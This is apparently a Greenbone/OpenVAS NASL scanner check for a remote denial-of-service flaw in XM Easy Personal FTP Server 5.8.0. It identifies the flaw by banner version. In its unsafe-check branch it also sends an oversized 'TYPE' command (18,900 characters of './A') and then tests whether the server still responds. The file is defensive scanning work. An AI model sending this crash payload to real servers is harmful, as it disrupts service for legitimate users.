# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103072");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-02-11 13:54:50 +0100 (Fri, 11 Feb 2011)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_name("XM Easy Personal FTP Server 'TYPE' Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46314");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_MIXED_ATTACK);
  script_family("FTP");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/xm_easy_personal/detected");

  script_tag(name:"summary", value:"XM Easy Personal FTP Server is prone to a remote denial-of-service
  vulnerability.");

  script_tag(name:"impact", value:"This issue allows remote attackers to crash affected FTP servers,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"XM Easy Personal FTP Server 5.8.0 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if(!banner || "Welcome to DXM's FTP Server" >!< banner)
  exit(0);

if(safe_checks()) {
  if(egrep(pattern: "Welcome to DXM's FTP Server", string:banner)) {
    version = eregmatch(pattern: "Welcome to DXM's FTP Server ([0-9.]+)", string: banner);
    if(!isnull(version[1])) {
      if(version_is_equal(version:version[1], test_version:"5.8.0")) {
        report = report_fixed_ver(installed_version:version[1], fixed_version:"None");
        security_message(port:port, data:report);
        exit(0);
      }
    }
    exit(99);
  }
  exit(0);
} else {

  soc = open_sock_tcp(port);
  if(!soc){
    exit(0);
  }

  banner = ftp_recv_line(socket:soc);
  ftp_close(socket:soc);
  if(!banner || "Welcome to DXM's FTP Server" >!< banner){
    exit(0);
  }

  soc1 = open_sock_tcp(port);
  if(!soc1){
    exit(0);
  }

  kb_creds = ftp_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details)
  {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    if(ftpPort2)
    {
      soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
      if(soc2)
      {
        bo_data = string("TYPE ", crap(length: 18900, data:"./A"));
        send(socket:soc1, data:bo_data);
        close(soc2);
        close(soc1);

        sleep(2);

        soc3 = open_sock_tcp(port);

        if( ! ftp_recv_line(socket:soc3) )
        {
          security_message(port:port);
          close(soc3);
          exit(0);
        }
        close(soc3);
      }
    }
  }
}

exit(0);
